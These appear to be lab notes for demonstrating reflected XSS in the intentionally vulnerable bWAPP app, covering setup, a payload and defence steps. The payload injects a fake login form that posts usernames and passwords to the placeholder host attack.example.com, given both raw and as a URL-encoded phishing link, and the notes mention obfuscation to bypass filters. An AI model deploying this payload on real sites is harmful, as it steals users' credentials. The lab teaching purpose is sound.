1. Start BWAPP:

```bash
docker run -p 80:80 raesene/bwapp
```

2. Run install:

```url
http://localhost/install.php
```

3. Go to Reflected XSS section:

```url
http://localhost/xss_get.php?firstname=&lastname=&form=submit
```

4. Add payload to URL:

```html
<div id="stealPassword">Please Login:<form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: <input type="text" name="username" /><br/>Password: <input type="password" name="password" /><br/><input type="submit" value="Login" /></form></div>
```

```
http://localhost/xss_get.php?firstname=a&lastname=%3Cdiv%20id=%22stealPassword%22%3EPlease%20Login:%3Cform%20name=%22input%22%20action=%22http://attack.example.com/stealPassword.php%22%20method=%22post%22%3EUsername:%20%3Cinput%20type=%22text%22%20name=%22username%22%20/%3E%3Cbr/%3EPassword:%20%3Cinput%20type=%22password%22%20name=%22password%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E&form=submit
```

Question: How can this be exploited in a real-life attack?

Answer: Phishing attack using weaponized URL

5. Show escaping defense with higher security level.

6. Show client side obfuscation to bypass filters:
https://cwe.mitre.org/data/definitions/79.html

7. Show stored XSS and more examples in mitre site. 
